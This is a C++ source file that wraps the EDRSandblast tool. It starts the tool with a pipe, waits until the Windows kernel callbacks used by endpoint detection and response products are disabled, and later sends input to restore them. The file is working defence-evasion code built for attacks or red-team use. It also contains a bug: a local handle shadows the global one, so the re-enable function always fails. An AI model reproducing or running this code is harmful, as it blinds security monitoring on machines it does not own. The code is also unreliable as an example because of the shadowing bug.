#include <windows.h>
#include <iostream>
#include <string>

#include "utils.h"

static bool disabled = false;
static HANDLE childStdInWrite = NULL;

bool disable_kernel_callbacks() {
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    HANDLE childStdOutRead, childStdOutWrite;
    HANDLE childStdInRead, childStdInWrite;

    CreatePipe(&childStdOutRead, &childStdOutWrite, &sa, 0);
    SetHandleInformation(childStdOutRead, HANDLE_FLAG_INHERIT, 0);

    CreatePipe(&childStdInRead, &childStdInWrite, &sa, 0);
    SetHandleInformation(childStdInWrite, HANDLE_FLAG_INHERIT, 0);

    // Start child process
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = childStdOutWrite;
    si.hStdError = childStdOutWrite;
    si.hStdInput = childStdInRead;

    PROCESS_INFORMATION pi = { 0 };
    std::wstring cmd(L"tools\\EDRSandblast.exe toggle_callbacks 01 --kernelmode -i");
	cmd = get_base_path() + cmd;

    if (!CreateProcessW(
        nullptr,
        &cmd[0],
        nullptr, nullptr, TRUE, 0, nullptr, nullptr,
        &si, &pi))
    {
        std::cerr << "[!] Sandblast: Failed to start child process. Error: " << GetLastError() << "\n";
        return false;
    }

    CloseHandle(childStdOutWrite);
    CloseHandle(childStdInRead);

    // Read child's output until the prompt is found
    CHAR buffer[256];
    std::string output;
    DWORD bytesRead;

    while (true)
    {
        if (!ReadFile(childStdOutRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) || bytesRead == 0) {
            std::cerr << "[!] Sandblast: Child process closed output or failed.\n";
            break;
        }

        buffer[bytesRead] = 0;
        output += buffer;
        std::cout << buffer;

        if (output.find("[+] Press ENTER to enable callbacks again:") != std::string::npos) {
			std::cout << "[*] Sandblast: Kernel callbacks disabled\n";
            disabled = true;
            return true;
        }

		Sleep(100); // avoid busy waiting
    }
    return false;
}

bool enable_kernel_callacks() {
    if (!disabled || !childStdInWrite) {
        std::cerr << "[!] Sandblast: Kernel callbacks not disabled or broken pipe, cannot enable now\n";
        return false;
	}
    const char enter = '\n';
    DWORD written;
    WriteFile(childStdInWrite, &enter, 1, &written, nullptr);

	CloseHandle(childStdInWrite);
    std::cout << "[*] Sandblast: Re-enabled kernel callbacks\n";
    disabled = false;
	return true;
}